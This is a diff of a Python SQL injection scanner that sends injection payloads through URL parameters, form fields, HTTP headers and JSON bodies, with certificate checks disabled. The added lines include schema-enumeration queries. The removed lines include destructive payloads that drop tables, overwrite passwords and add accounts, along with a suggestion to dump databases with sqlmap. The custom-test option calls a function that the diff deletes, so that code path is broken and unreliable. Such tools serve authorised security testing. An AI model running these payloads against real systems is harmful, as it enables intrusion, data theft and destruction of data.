@@ -1,261 +1,359 @@
 #!/usr/bin/env python3
 """
-Automated SQL Injection Tester
-Advanced SQL injection detection and exploitation tool
+Automated SQL Injection Tester (Advanced)
+Tests GET parameters, POST body, HTTP headers, and JSON payloads for SQLi vulnerabilities.
 """
 
 import requests
 import urllib.parse
+import json
 import time
 import re
+import sys
+from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 import urllib3
+
+# Add parent directory to path for imports
+sys.path.insert(0, str(Path(__file__).parent.parent))
+
+from core import setup_logger, get_validated_input, validate_url, ScanResult, Finding, get_session
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# SQL Injection Payloads Database
+SQL_PAYLOADS = {
+    'error_based': [
+        "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
+        "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
+        "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
+        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
+        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
+        "1' AND 1=1--", "1' AND 1=2--"
+    ],
+    'union_based': [
+        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
+        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
+        "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
+    ],
+    'boolean_based': [
+        "1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
+        "1 AND 1=1", "1 AND 1=2"
+    ],
+    'time_based': [
+        "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5('test'))--",
+        "1'; WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    ]
+}
+
+ERROR_SIGNATURES = [
+    'SQL syntax', 'mysql_fetch', 'Warning: mysql', 'mysqli_', 'MySQLSyntaxErrorException',
+    'valid MySQL result', 'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
+    'Npgsql.', 'Driver.*SQL.*Error', 'ORA-', 'Oracle.*Driver', 'oracle.*error',
+    'Microsoft SQL Native Client error', 'ODBC SQL Server Driver', 'SQLServer JDBC Driver',
+    'SqlClient', 'Unclosed quotation mark', 'quoted string not properly terminated',
+]
+
+
 def run():
+    logger = setup_logger("sql_injector")
+    logger.info("SQL Injection Tester started")
+    
     print("\033[92m" + "="*70)
-    print("           AUTOMATED SQL INJECTION TESTER")
+    print("        AUTOMATED SQL INJECTION TESTER (Advanced)")
     print("="*70 + "\033[0m\n")
     
     print("\033[93m[!] WARNING: Only test applications you own or have permission to test!\033[0m\n")
     
-    # SQL Injection Payloads Database
-    SQL_PAYLOADS = {
-        'error_based': [
-            "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
-            "admin' --", "admin' #", "admin'/*", "' or 1=1--", "' or 1=1#",
-            "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--",
-            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
-            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
-            "1' AND 1=1--", "1' AND 1=2--"
-        ],
-        'union_based': [
-            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
-            "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
-            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
-            "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
-            "1' UNION SELECT user(),database()--", "1' UNION SELECT version(),@@version--"
-        ],
-        'boolean_based': [
-            "1' AND '1'='1", "1' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
-            "1 AND 1=1", "1 AND 1=2", "' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('A'))--"
-        ],
-        'time_based': [
-            "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,MD5('test'))--",
-            "1'; WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "' OR SLEEP(5)--", "1' AND IF(1=1,SLEEP(5),0)--"
-        ],
-        'stacked_queries': [
-            "'; DROP TABLE users--", "1'; UPDATE users SET password='hacked'--",
-            "1'; INSERT INTO users VALUES('hacker','pass')--", "1'; EXEC sp_MSforeachtable 'DROP TABLE ?'--"
-        ]
-    }
+    try:
+        target_url = input("\033[97m[?] Enter target URL: \033[0m").strip()
+        if not target_url:
+            print("\033[91m[!] No URL provided.\033[0m")
+            return
+        
+        # Validate URL
+        try:
+            target_url = validate_url(target_url)
+        except ValueError as e:
+            print(f"\033[91m[!] Invalid URL: {e}\033[0m")
+            logger.error(f"Invalid URL: {e}")
+            return
+        
+        logger.info(f"Target: {target_url}")
+        
+        print("\n\033[97m[*] Testing Options:\033[0m")
+        print("  [1] GET Parameters (quick)")
+        print("  [2] POST Body (form data)")
+        print("  [3] HTTP Headers (User-Agent, Referer, etc.)")
+        print("  [4] JSON Body (API endpoints)")
+        print("  [5] All Methods (comprehensive)")
+        print("  [6] Custom")
+        
+        choice = input("\n\033[95m[?] Select test type: \033[0m").strip()
+        
+        session = get_session(rotate_ua=True)
+        
+        # Create result object
+        result = ScanResult(
+            tool="sql_injector",
+            target=target_url
+        )
+        
+        vulnerabilities = []
+        
+        if choice == '1':
+            logger.info("Testing GET parameters")
+            vulnerabilities = test_get_parameters(target_url, session, logger)
+        
+        elif choice == '2':
+            logger.info("Testing POST body")
+            vulnerabilities = test_post_body(target_url, session, logger)
+        
+        elif choice == '3':
+            logger.info("Testing HTTP headers")
+            vulnerabilities = test_headers(target_url, session, logger)
+        
+        elif choice == '4':
+            logger.info("Testing JSON body")
+            vulnerabilities = test_json_body(target_url, session, logger)
+        
+        elif choice == '5':
+            logger.info("Running comprehensive test (all methods)")
+            vulnerabilities = []
+            vulnerabilities.extend(test_get_parameters(target_url, session, logger))
+            time.sleep(1)
+            vulnerabilities.extend(test_post_body(target_url, session, logger))
+            time.sleep(1)
+            vulnerabilities.extend(test_headers(target_url, session, logger))
+            time.sleep(1)
+            vulnerabilities.extend(test_json_body(target_url, session, logger))
+        
+        elif choice == '6':
+            test_method = input("\033[97m[?] Enter test method (get/post/header/json): \033[0m").strip().lower()
+            custom_param = input("\033[97m[?] Enter parameter name to test: \033[0m").strip()
+            custom_payload = input("\033[97m[?] Enter custom payload: \033[0m").strip()
+            
+            if test_method == 'get':
+                vulnerabilities = [test_payload(target_url, custom_param, custom_payload, 'get', session, logger)]
+            elif test_method == 'post':
+                vulnerabilities = [test_payload(target_url, custom_param, custom_payload, 'post', session, logger)]
+            else:
+                print("\033[91m[!] Invalid test method.\033[0m")
+                return
+        
+        else:
+            print("\033[91m[!] Invalid choice.\033[0m")
+            logger.error("Invalid test type choice")
+            return
+        
+        # Filter out None results
+        vulnerabilities = [v for v in vulnerabilities if v is not None]
+        
+        # Add findings to result
+        for vuln in vulnerabilities:
+            result.add_finding_dict(
+                title=f"SQL Injection - {vuln['technique']}",
+                description=f"Potential SQLi in {vuln['location']}",
+                severity="CRITICAL",
+                finding_type="sql_injection",
+                details=vuln
+            )
+        
+        # Display results
+        print(f"\n\033[92m{'='*70}\033[0m")
+        print(f"\033[92m[*] SQL Injection Testing Complete\033[0m")
+        print(f"\033[92m{'='*70}\033[0m\n")
+        
+        if vulnerabilities:
+            print(f"\033[91m[!] FOUND {len(vulnerabilities)} POTENTIAL SQL INJECTION VULNERABILITIES!\033[0m\n")
+            
+            for i, v in enumerate(vulnerabilities, 1):
+                print(f"\033[93m[{i}] Location: {v['location']}\033[0m")
+                print(f"    Technique: {v['technique']}")
+                print(f"    Parameter: {v['param']}")
+                print(f"    Payload: {v['payload'][:60]}...")
+                print(f"    Evidence: {v['evidence']}\n")
+            
+            logger.warning(f"Found {len(vulnerabilities)} potential SQLi vulnerabilities")
+            
+            # Save results
+            save = input("\033[95m[?] Save results to JSON file? (y/n): \033[0m").strip().lower()
+            if save == 'y':
+                filename = f"sqli_results_{int(time.time())}.json"
+                try:
+                    result.save_to_file(filename)
+                    print(f"\033[92m[*] Results saved to {filename}\033[0m")
+                    logger.info(f"Results saved to {filename}")
+                except Exception as e:
+                    logger.error(f"Error saving file: {e}")
+                    print(f"\033[91m[!] Error saving file: {e}\033[0m")
+        else:
+            print(f"\033[92m[*] No SQL injection vulnerabilities detected.\033[0m")
+            logger.info("No vulnerabilities detected")
+        
+        return result
+        
+    except KeyboardInterrupt:
+        print("\n\033[91m[!] Test interrupted by user.\033[0m")
+        logger.warning("Test interrupted by user")
+        return None
     
-    ERROR_SIGNATURES = [
-        'SQL syntax', 'mysql_fetch', 'Warning: mysql', 'mysqli_', 'MySQLSyntaxErrorException',
-        'valid MySQL result', 'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
-        'Npgsql.', 'Driver.*SQL.*Error', 'ORA-', 'Oracle.*Driver', 'oracle.*error',
-        'Microsoft SQL Native Client error', 'ODBC SQL Server Driver', 'SQLServer JDBC Driver',
-        'SqlClient', 'Unclosed quotation mark', 'quoted string not properly terminated',
-        'Error Executing Database Query', 'Microsoft JET Database', 'ADODB.Field error',
-        'iBATIS', 'Dynamic SQL Error', 'Sybase message', 'DB2 SQL error',
-        '[SQLITE_ERROR]', 'SQLite/JDBCDriver', 'System.Data.SQLite.SQLiteException'
-    ]
-    
-    target_url = input("\033[97m[?] Enter target URL (with parameter, e.g., http://site.com/page?id=1): \033[0m").strip()
-    if not target_url:
-        print("\033[91m[!] No URL provided.\033[0m")
-        return
-    
-    print("\n\033[97m[*] Testing Options:\033[0m")
-    print("  [1] Quick Scan (Error-based only)")
-    print("  [2] Standard Scan (Error + Boolean)")
-    print("  [3] Advanced Scan (All techniques)")
-    print("  [4] Custom Payload Test")
-    print("  [5] Time-based Blind SQLi")
-    
-    choice = input("\n\033[95m[?] Select scan type: \033[0m").strip()
-    
-    # Parse URL and parameters
-    parsed = urllib.parse.urlparse(target_url)
-    params = urllib.parse.parse_qs(parsed.query)
-    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-    
-    if not params:
-        print("\033[91m[!] No parameters found in URL. Please provide a URL with parameters.\033[0m")
-        return
-    
-    print(f"\n\033[92m[*] Target: {base_url}\033[0m")
-    print(f"\033[97m[*] Parameters found: {list(params.keys())}\033[0m\n")
-    
+    except Exception as e:
+        logger.error(f"Unexpected error: {e}", exc_info=True)
+        print(f"\033[91m[!] Unexpected error: {e}\033[0m")
+        return None
+
+
+def test_get_parameters(target_url, session, logger):
+    """Test GET parameters for SQL injection."""
     vulnerabilities = []
     
-    def test_payload(param_name, payload, technique):
-        """Test a single payload"""
-        try:
-            # Create modified parameters
-            test_params = params.copy()
-            test_params[param_name] = [payload]
-            
-            # Build URL
-            query_string = urllib.parse.urlencode(test_params, doseq=True)
-            test_url = f"{base_url}?{query_string}"
-            
-            # Send request with timeout
-            start_time = time.time()
-            response = requests.get(test_url, timeout=10, verify=False, allow_redirects=True)
-            response_time = time.time() - start_time
-            
-            # Check for SQL errors
-            for signature in ERROR_SIGNATURES:
-                if re.search(signature, response.text, re.IGNORECASE):
-                    return {
-                        'vulnerable': True,
-                        'param': param_name,
-                        'payload': payload,
-                        'technique': technique,
-                        'evidence': signature,
-                        'response_code': response.status_code
-                    }
-            
-            # Time-based detection
-            if technique == 'time_based' and response_time > 4:
-                return {
-                    'vulnerable': True,
-                    'param': param_name,
-                    'payload': payload,
-                    'technique': technique,
-                    'evidence': f'Delayed response ({response_time:.2f}s)',
-                    'response_code': response.status_code
-                }
-            
-            return None
-            
-        except requests.Timeout:
-            if 'SLEEP' in payload or 'WAITFOR' in payload:
-                return {
-                    'vulnerable': True,
-                    'param': param_name,
-                    'payload': payload,
-                    'technique': 'time_based',
-                    'evidence': 'Request timeout (possible time-based SQLi)',
-                    'response_code': 'TIMEOUT'
-                }
-        except Exception as e:
-            return None
+    parsed = urllib.parse.urlparse(target_url)
+    params = urllib.parse.parse_qs(parsed.query)
     
-    # Select payloads based on scan type
-    payloads_to_test = []
+    if not params:
+        print("\033[97m[*] No GET parameters found.\033[0m")
+        logger.info("No GET parameters found")
+        return vulnerabilities
     
-    if choice == '1':
-        payloads_to_test = [('error_based', p) for p in SQL_PAYLOADS['error_based']]
-    elif choice == '2':
-        payloads_to_test = [('error_based', p) for p in SQL_PAYLOADS['error_based']]
-        payloads_to_test += [('boolean_based', p) for p in SQL_PAYLOADS['boolean_based']]
-    elif choice == '3':
-        for technique, payloads in SQL_PAYLOADS.items():
-            payloads_to_test += [(technique, p) for p in payloads]
-    elif choice == '4':
-        custom_payload = input("\033[97m[?] Enter custom SQL payload: \033[0m").strip()
-        if custom_payload:
-            payloads_to_test = [('custom', custom_payload)]
-    elif choice == '5':
-        payloads_to_test = [('time_based', p) for p in SQL_PAYLOADS['time_based']]
-    else:
-        print("\033[91m[!] Invalid choice.\033[0m")
-        return
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+    print(f"\033[96m[*] Testing GET parameters: {list(params.keys())}\033[0m")
     
-    print(f"\n\033[92m[*] Starting SQL injection test with {len(payloads_to_test)} payloads...\033[0m")
-    print("\033[93m[*] This may take a while...\033[0m\n")
-    
-    tested = 0
-    
-    # Test each parameter with each payload
     for param_name in params.keys():
-        print(f"\033[96m[*] Testing parameter: {param_name}\033[0m")
-        
-        for technique, payload in payloads_to_test:
-            tested += 1
-            print(f"\r\033[97m[*] Progress: {tested}/{len(payloads_to_test) * len(params)} payloads tested\033[0m", end='', flush=True)
-            
-            result = test_payload(param_name, payload, technique)
-            
-            if result and result['vulnerable']:
-                vulnerabilities.append(result)
-                print(f"\n\033[91m[!] VULNERABILITY FOUND!\033[0m")
-                print(f"    \033[93mParameter: {result['param']}\033[0m")
-                print(f"    \033[93mTechnique: {result['technique']}\033[0m")
-                print(f"    \033[93mPayload: {result['payload'][:50]}...\033[0m")
-                print(f"    \033[93mEvidence: {result['evidence']}\033[0m\n")
-            
-            time.sleep(0.1)  # Rate limiting
-    
-    print("\n")
-    
-    # Results Summary
-    print(f"\n\033[92m{'='*70}\033[0m")
-    print(f"\033[92m[*] SQL Injection Testing Complete\033[0m")
-    print(f"\033[92m{'='*70}\033[0m\n")
-    
-    if vulnerabilities:
-        print(f"\033[91m[!] FOUND {len(vulnerabilities)} POTENTIAL SQL INJECTION VULNERABILITIES!\033[0m\n")
-        
-        # Group by parameter
-        vuln_by_param = {}
-        for v in vulnerabilities:
-            if v['param'] not in vuln_by_param:
-                vuln_by_param[v['param']] = []
-            vuln_by_param[v['param']].append(v)
-        
-        for param, vulns in vuln_by_param.items():
-            print(f"\033[93m[+] Parameter: {param}\033[0m")
-            techniques = set([v['technique'] for v in vulns])
-            print(f"    \033[97mVulnerable to: {', '.join(techniques)}\033[0m")
-            print(f"    \033[97mTotal payloads: {len(vulns)}\033[0m\n")
-        
-        # Save results
-        save = input("\033[95m[?] Save detailed results to file? (y/n): \033[0m").strip().lower()
-        if save == 'y':
-            filename = input("\033[97m[?] Enter filename (default: sqli_results.txt): \033[0m").strip() or "sqli_results.txt"
-            try:
-                with open(filename, 'w', encoding='utf-8') as f:
-                    f.write(f"SQL Injection Test Results\n")
-                    f.write(f"{'='*70}\n")
-                    f.write(f"Target: {target_url}\n")
-                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n\n")
-                    
-                    for param, vulns in vuln_by_param.items():
-                        f.write(f"\nParameter: {param}\n")
-                        f.write(f"{'-'*70}\n")
-                        for v in vulns:
-                            f.write(f"Technique: {v['technique']}\n")
-                            f.write(f"Payload: {v['payload']}\n")
-                            f.write(f"Evidence: {v['evidence']}\n")
-                            f.write(f"Response Code: {v['response_code']}\n\n")
+        for technique, payloads in SQL_PAYLOADS.items():
+            for payload in payloads:
+                test_params = params.copy()
+                test_params[param_name] = [payload]
+                query_string = urllib.parse.urlencode(test_params, doseq=True)
+                test_url = f"{base_url}?{query_string}"
                 
-                print(f"\033[92m[*] Results saved to {filename}\033[0m")
-            except Exception as e:
-                print(f"\033[91m[!] Error saving file: {str(e)}\033[0m")
-        
-        # Exploitation recommendations
-        print(f"\n\033[96m[*] Recommended Next Steps:\033[0m")
-        if any(v['technique'] == 'union_based' for v in vulnerabilities):
-            print("  • Use UNION-based payloads to extract data")
-            print("  • Try: sqlmap -u \"{}\" --dump".format(target_url))
-        if any(v['technique'] == 'time_based' for v in vulnerabilities):
-            print("  • Use time-based blind SQLi for data extraction")
-            print("  • Consider automated tools for blind SQLi")
-        
-    else:
-        print(f"\033[92m[*] No SQL injection vulnerabilities detected.\033[0m")
-        print(f"\033[97m[*] The application appears to be protected against basic SQL injection.\033[0m")
+                result = test_payload_request(test_url, param_name, payload, technique, "GET parameter", logger)
+                if result:
+                    vulnerabilities.append(result)
+                    print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
     
-    print(f"\n\033[97m[*] Total payloads tested: {tested}\033[0m")
-    print(f"\033[97m[*] Parameters tested: {len(params)}\033[0m\n")
+    return vulnerabilities
+
+
+def test_post_body(target_url, session, logger):
+    """Test POST body parameters for SQL injection."""
+    vulnerabilities = []
+    
+    print(f"\033[96m[*] Testing POST body parameters...\033[0m")
+    
+    # Common POST parameter names
+    common_params = ['username', 'password', 'email', 'name', 'id', 'search', 'query']
+    
+    for param_name in common_params:
+        for technique, payloads in SQL_PAYLOADS.items():
+            for payload in payloads:
+                data = {param_name: payload}
+                
+                try:
+                    response = requests.post(target_url, data=data, timeout=10, verify=False)
+                    result = check_response(param_name, payload, technique, "POST body", response, logger)
+                    if result:
+                        vulnerabilities.append(result)
+                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
+                except Exception as e:
+                    logger.debug(f"Error testing {param_name}: {e}")
+    
+    return vulnerabilities
+
+
+def test_headers(target_url, session, logger):
+    """Test HTTP headers for SQL injection."""
+    vulnerabilities = []
+    
+    print(f"\033[96m[*] Testing HTTP headers...\033[0m")
+    
+    # Headers to test
+    headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'Cookie', 'Accept-Language']
+    
+    for header_name in headers_to_test:
+        for technique, payloads in SQL_PAYLOADS.items():
+            for payload in payloads[:5]:  # Limit payloads per header for speed
+                headers = {header_name: payload}
+                
+                try:
+                    response = requests.get(target_url, headers=headers, timeout=10, verify=False)
+                    result = check_response(header_name, payload, technique, f"HTTP Header: {header_name}", response, logger)
+                    if result:
+                        vulnerabilities.append(result)
+                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
+                except Exception as e:
+                    logger.debug(f"Error testing header {header_name}: {e}")
+    
+    return vulnerabilities
+
+
+def test_json_body(target_url, session, logger):
+    """Test JSON body (API endpoints) for SQL injection."""
+    vulnerabilities = []
+    
+    print(f"\033[96m[*] Testing JSON body (API endpoints)...\033[0m")
+    
+    # Common JSON parameters for APIs
+    common_json_params = ['id', 'search', 'query', 'username', 'email', 'filter']
+    
+    for param_name in common_json_params:
+        for technique, payloads in SQL_PAYLOADS.items():
+            for payload in payloads[:5]:  # Limit for speed
+                json_data = {param_name: payload}
+                
+                try:
+                    response = requests.post(target_url, json=json_data, timeout=10, verify=False)
+                    result = check_response(param_name, payload, technique, "JSON body", response, logger)
+                    if result:
+                        vulnerabilities.append(result)
+                        print(f"\033[91m[!] FOUND: {result['location']} ({result['technique']})\033[0m")
+                except Exception as e:
+                    logger.debug(f"Error testing JSON param {param_name}: {e}")
+    
+    return vulnerabilities
+
+
+def test_payload_request(url, param_name, payload, technique, location, logger):
+    """Send a test request and check for SQLi indicators."""
+    try:
+        response = requests.get(url, timeout=10, verify=False)
+        return check_response(param_name, payload, technique, location, response, logger)
+    except requests.Timeout:
+        if 'SLEEP' in payload:
+            return {
+                'param': param_name,
+                'payload': payload,
+                'technique': technique,
+                'location': location,
+                'evidence': 'Request timeout (possible time-based SQLi)',
+                'status_code': 'TIMEOUT'
+            }
+    except Exception as e:
+        logger.debug(f"Error testing payload: {e}")
+    
+    return None
+
+
+def check_response(param_name, payload, technique, location, response, logger):
+    """Check response for SQL error signatures."""
+    for signature in ERROR_SIGNATURES:
+        if re.search(signature, response.text, re.IGNORECASE):
+            finding = {
+                'param': param_name,
+                'payload': payload,
+                'technique': technique,
+                'location': location,
+                'evidence': f'SQL error signature found: {signature}',
+                'status_code': response.status_code
+            }
+            logger.warning(f"SQLi found: {location} - {signature}")
+            return finding
+    
+    return None
+
 
 if __name__ == "__main__":
     run()
